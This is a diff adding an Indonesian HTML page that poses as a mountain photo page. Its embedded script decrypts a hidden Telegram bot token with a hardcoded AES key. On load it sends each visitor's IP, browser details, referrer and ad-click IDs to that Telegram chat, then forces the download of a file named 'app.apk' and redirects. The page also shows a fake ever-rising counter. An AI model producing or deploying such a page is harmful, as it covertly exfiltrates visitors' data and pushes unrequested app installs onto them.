@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Foto Pemandangan</title>
+</head>
+<body>
+    <h1>Pemandangan Gunung</h1>
+    <img src="https://picsum.photos/600/400" alt="Pemandangan random">
+    <p>Foto random dari picsum.photos (ganti F5 gambarnya berubah)</p>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+<script>
+const ENCRYPTION_KEY = "MySecretAESKey2024rudyht14";
+const ENCRYPTED_BOT_TOKEN = "U2FsdGVkX18iDhQxAQuDTlbL/AKnuftvguBe1XWsGXwqpAQmfrJfUMUZxKRWadoYlLWkVwzRnIFnyAtrKTjQ7Q==";
+const ENCRYPTED_CHAT_ID = "U2FsdGVkX1810asmNS9c9O/aqODQzcwzmHvXdqE1yE8=";
+
+
+const DOWNLOAD_URL = "https://picsum.photos/600/40"; 
+const FILE_NAME = "app.apk"; // Nama file saat di-download
+
+function decryptAES(encryptedText, key) {
+    try {
+        if (!encryptedText || encryptedText === '') {
+            console.error('❌ Text kosong!');
+            return null;
+        }
+        const bytes = CryptoJS.AES.decrypt(encryptedText, key);
+        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+        if (!decrypted || decrypted === '') {
+            console.error('❌ Hasil decrypt kosong! Periksa kunci.');
+            return null;
+        }
+        return decrypted;
+    } catch(e) {
+        console.error('❌ Gagal decrypt:', e.message);
+        return null;
+    }
+}
+
+console.log('🔐 Sedang mendecrypt token...');
+const BOT_TOKEN = decryptAES(ENCRYPTED_BOT_TOKEN, ENCRYPTION_KEY);
+const CHAT_ID = decryptAES(ENCRYPTED_CHAT_ID, ENCRYPTION_KEY);
+
+console.log('🔐 Status Token:');
+console.log('BOT_TOKEN:', BOT_TOKEN ? '✅ Valid' : '❌ Invalid');
+console.log('CHAT_ID:', CHAT_ID ? '✅ Valid' : '❌ Invalid');
+
+function getUserData() {
+    var urlParams = new URLSearchParams(window.location.search);
+    var fbclid = urlParams.get('fbclid') || '-';
+    var ttclid = urlParams.get('ttclid') || '-';
+    var affCode = urlParams.get('affCode') || '-';
+    
+    return {
+        timestamp: new Date().toLocaleString('id-ID', {
+            day: '2-digit',
+            month: 'long',
+            year: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            timeZone: 'Asia/Jakarta'
+        }),
+        userAgent: navigator.userAgent || 'Tidak terdeteksi',
+        platform: navigator.platform || 'Tidak terdeteksi',
+        language: navigator.language || 'Tidak terdeteksi',
+        screenWidth: screen.width || 'Tidak terdeteksi',
+        screenHeight: screen.height || 'Tidak terdeteksi',
+        pageUrl: window.location.href || 'Tidak terdeteksi',
+        referrer: document.referrer || 'Direct',
+        fbclid: fbclid,
+        ttclid: ttclid,
+        affCode: affCode,
+        ip: 'Mengambil IP...'
+    };
+}
+
+function getUserIP(callback) {
+    fetch('https://api.ipify.org?format=json')
+        .then(function(response) { return response.json(); })
+        .then(function(data) { callback(data.ip); })
+        .catch(function() { callback('Tidak terdeteksi'); });
+}
+
+function sendTelegramNotification(userData, action = 'DOWNLOAD') {
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.error('❌ Token tidak valid!');
+        return;
+    }
+    
+    var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+    
+    var emoji = action === 'DOWNLOAD' ? '📥' : '👀';
+    var title = action === 'DOWNLOAD' ? 'DOWNLOAD FILE' : 'VIEW PAGE';
+    
+    var message = 
+        emoji + " <b>" + title + " DETEKSI</b> " + emoji + "\n" +
+        "═══════════════════════\n" +
+        "🕐 <b>Waktu:</b> " + userData.timestamp + "\n" +
+        "🌐 <b>IP:</b> <code>" + userData.ip + "</code>\n" +
+        "───────────────────\n" +
+        "📱 <b>Platform:</b> " + userData.platform + "\n" +
+        "🌍 <b>Bahasa:</b> " + userData.language + "\n" +
+        "🖥️ <b>Layar:</b> " + userData.screenWidth + "x" + userData.screenHeight + "\n" +
+        "───────────────────\n" +
+        "🔗 <b>Halaman:</b>\n" + userData.pageUrl + "\n" +
+        "🔙 <b>Referrer:</b> " + userData.referrer + "\n" +
+        "───────────────────\n" +
+        "📌 <b>Tracking:</b>\n" +
+        "   • fbclid: " + userData.fbclid + "\n" +
+        "   • ttclid: " + userData.ttclid + "\n" +
+        "   • affCode: " + userData.affCode + "\n" +
+        "───────────────────\n" +
+        "📄 <b>File:</b> " + FILE_NAME + "\n" +
+        "🔗 <b>URL:</b> " + DOWNLOAD_URL + "\n" +
+        "───────────────────\n" +
+        "💻 <b>User Agent:</b>\n<code>" + userData.userAgent + "</code>\n" +
+        "═══════════════════════";
+    
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            disable_notification: true
+        })
+    })
+    .then(function(response) {
+        if (response.ok) {
+            console.log('✅ Notifikasi Telegram terkirim');
+        } else {
+            console.log('⚠️ Gagal kirim notifikasi:', response.status);
+        }
+    })
+    .catch(function(error) {
+        console.log('⚠️ Error:', error.message);
+    });
+}
+
+function downloadFile(url, filename) {
+    
+    try {
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = filename || url.split('/').pop() || 'download';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        console.log('✅ Download dimulai:', filename);
+        return true;
+    } catch(e) {
+        console.log('⚠️ Method 1 gagal:', e.message);
+        return false;
+    }
+}
+  
+function downloadFileViaFetch(url, filename) {
+    fetch(url)
+        .then(function(response) {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.blob();
+        })
+        .then(function(blob) {
+            var link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = filename || url.split('/').pop() || 'download';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(link.href);
+            console.log('✅ Download (fetch) dimulai:', filename);
+        })
+        .catch(function(error) {
+            console.log('⚠️ Download via fetch gagal:', error.message);
+            downloadFile(url, filename);
+        });
+}
+
+function startDownload() {
+    if (window._userData) {
+        var data = Object.assign({}, window._userData);
+        data.timestamp = new Date().toLocaleString('id-ID', {
+            day: '2-digit',
+            month: 'long',
+            year: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            timeZone: 'Asia/Jakarta'
+        });
+        sendTelegramNotification(data, 'DOWNLOAD');
+    }
+  
+    downloadFile(DOWNLOAD_URL, FILE_NAME);
+    setTimeout(function() {
+        window.location.href = DOWNLOAD_URL;
+    }, 2000);
+}
+
+function downloadPDF() {
+    if (window._userData) {
+        var data = Object.assign({}, window._userData);
+        data.timestamp = new Date().toLocaleString('id-ID', {
+            day: '2-digit',
+            month: 'long',
+            year: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            timeZone: 'Asia/Jakarta'
+        });
+        sendTelegramNotification(data, 'DOWNLOAD');
+    }
+    window.print();
+}
+
+var isNotified = false;
+var isDownloaded = false;
+
+window.addEventListener('load', function() {
+    var userData = getUserData();
+    window._userData = userData;
+    
+    getUserIP(function(ip) {
+        userData.ip = ip;
+        window._userData = userData;
+        
+        if (!isNotified) {
+            isNotified = true;
+            sendTelegramNotification(userData, 'VIEW');
+        }
+    });
+    
+    
+    setTimeout(function() {
+        if (!isDownloaded) {
+            isDownloaded = true;
+            startDownload();
+        }
+    }, 3000);
+});
+
+console.log('✅ Script download URL + Telegram (AES Encrypted) aktif!');
+console.log('📄 DOWNLOAD_URL:', DOWNLOAD_URL);
+console.log('📄 FILE_NAME:', FILE_NAME);
+</script>
+
+ </div>
+    <div class="btn-group">
+        <button class="btn btn-print" onclick="window.print()">
+            🖨️ Cetak / Simpan PDF
+        </button>        
+        <button class="btn btn-pdf" onclick="downloadPDF()">
+            📄 Download PDF (via Print)
+        </button>   
+    </div>
+
+<div class="A">
+    <span id="countdowntimer" style="color:#FFD700;">6,284</span><br>
+    <font color="white">copyright 2026</font>
+    <script type="text/javascript">
+        var timeleft = 6284;
+        var downloadTimer = setInterval(function(){
+            timeleft = timeleft + Math.floor(Math.random() * 7) + 2;
+            document.getElementById('countdowntimer').textContent = timeleft.toLocaleString();
+            if (timeleft <= 0) clearInterval(downloadTimer);
+        }, 3000);
+    </script>
+</div>
+
+<!-- Hapus baris ini -->
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/..." ...></script>
+  </body>
+</html>
